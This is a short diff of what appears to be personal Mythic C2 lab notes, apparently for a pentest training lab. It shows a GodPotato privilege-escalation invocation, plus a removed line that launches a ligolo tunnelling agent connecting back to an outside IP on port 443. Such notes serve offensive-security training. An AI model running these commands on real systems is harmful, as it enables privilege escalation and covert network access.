@@ -87,10 +87,10 @@ execute_assembly -Assembly GodPotato-NET4.exe -Arguments "-cmd 'c:\users\public\
 ## Download/Upload
 Self explanatory
 
-## Shell
-Runs cmd from the context of cmd. A command might look like
+## Run
+Runs an executable. A command might look like
 ```
-shell 'C:\Windows\tasks\windows-ligolo-agent.exe -connect 10.10.16.157:443 -ignore-cert'
+/prolab/cybernetic/ligolo
 ```
 ## References
 https://redsiege.com/blog/2023/06/introduction-to-mythic-c2/
